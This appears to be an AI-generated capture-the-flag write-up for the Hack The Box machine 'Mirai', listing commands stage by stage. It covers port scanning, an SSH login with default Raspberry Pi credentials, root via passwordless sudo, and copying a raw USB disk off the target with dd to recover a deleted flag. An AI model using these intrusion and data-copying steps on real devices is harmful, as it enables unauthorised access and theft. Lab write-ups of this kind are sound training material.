Here’s a clean, organized **walkthrough-style command reference** for **HTB: Mirai**, grouped by stage and including explanations for each step:

---

# 🧠 HTB: Mirai — Command Writeup

## 🛰️ Recon

### 🔍 Full Port Scan (All TCP Ports)
```bash
nmap -p- --min-rate 10000 10.10.10.48
```
> Scans all 65535 TCP ports with high speed. Found ports: 22 [SSH](SSH), 53 [DNS](DNS), 80 (HTTP), 1877 (UPnP), 32400 (Plex), 32469 (UPnP).

### 🔍 Targeted Service & Version Detection
```bash
nmap -p 22,53,80,1877,32400,32469 -sCV 10.10.10.48
```
> Runs default scripts and version detection on open ports.

### 🌐 Directory Brute-Force
```bash
feroxbuster -u http://10.10.10.48
```
> Discovers `/admin`, `/admin/scripts`, `/admin/img`, etc. — confirms it's a Pi-hole admin interface.

---

## 🔓 Shell as `pi` (User)

### 🔐 Attempt Default Raspberry Pi SSH Credentials
```bash
sshpass -p raspberry ssh pi@10.10.10.48
```
> Logs in successfully using default creds: `pi:raspberry`.

### 📄 Capture User Flag
```bash
cat ~/Desktop/user.txt
```

---

## 🧑‍💼 Shell as `root`

### 🔍 Check `sudo` Privileges
```bash
sudo -l
```
> Shows `pi` can run **ALL commands as root** without password.

### 🔁 Elevate to Root
```bash
sudo su -
# OR
sudo -i
```

---

## 🧪 Root Flag Recovery

### 🔍 Inspect Mounted Devices
```bash
mount
# or
lsblk
```
> Identifies `/dev/sdb` mounted as `/media/usbstick`.

### 🔍 Locate Files on USB Stick
```bash
cd /media/usbstick
find . -ls
```
> Sees `damnit.txt` and empty `lost+found`; no `root.txt`.

### 🔍 Search for 32-char Hex Flag (using `grep`)
```bash
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
```

### 🔍 Alternative: Search Printable Strings
```bash
strings /dev/sdb -n 32
```

---

## 📦 Optional: Extract Disk Image for Offline Analysis

### 🧲 Copy USB Disk to Local Machine
```bash
sshpass -p raspberry ssh pi@10.10.10.48 "sudo dd if=/dev/sdb | gzip -1 -" | dd of=usb.gz
```

### 🗜️ Decompress & Analyze
```bash
gunzip usb.gz
file usb     # Confirm it's an ext4 FS
```

### 🧱 Recover Deleted Files (with `extundelete`)
```bash
extundelete usb --restore-all
ls RECOVERED_FILES/
cat RECOVERED_FILES/root.txt
```